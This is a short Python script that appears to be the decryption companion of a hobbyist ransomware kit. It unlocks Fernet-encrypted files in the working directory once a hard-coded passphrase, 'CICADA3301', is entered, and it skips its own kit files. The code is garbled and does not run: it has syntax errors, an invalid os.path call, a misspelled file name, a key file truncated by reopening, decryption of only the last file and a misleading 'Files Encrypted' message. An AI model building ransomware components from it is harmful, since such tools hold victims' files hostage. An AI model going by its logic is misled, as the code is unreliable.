#!/usr/bin/env/python3

import os
from cryptography.fernet import Fernet
files =[]
for file in  os.listdir():
    if file == "equitybankdata.py": or file =="sentintel.key" or file == "decrypt.py":
    continue
if os.path(file):
        files.append(file)   
print(file)

with open("sentinel.key", "rb") as key:
    privatekey = key.read()

privatephrase = "CICADA3301"
user_phrase = input("Enter private phrase to decrypt your files\n")

key = Fernet.generate_key()
print(key)

with open("sentinel.key", "wb") as thekey:
    #sentinel.write(key)


    if user_phrase == privatephrase:
        for file in files:
            with open(file, "rb") as thefile:
                contents = thefile.read()
        contents_decrypted = Fernet(privatekey).decrypt(contents)
        with open(file,"wb") as thefile:
            thefile.write(contents_decrypted)
    else:
        print("Wrong Entry")
print("Files Encrypted")
d = open("file")
print(d.readline())
d.close()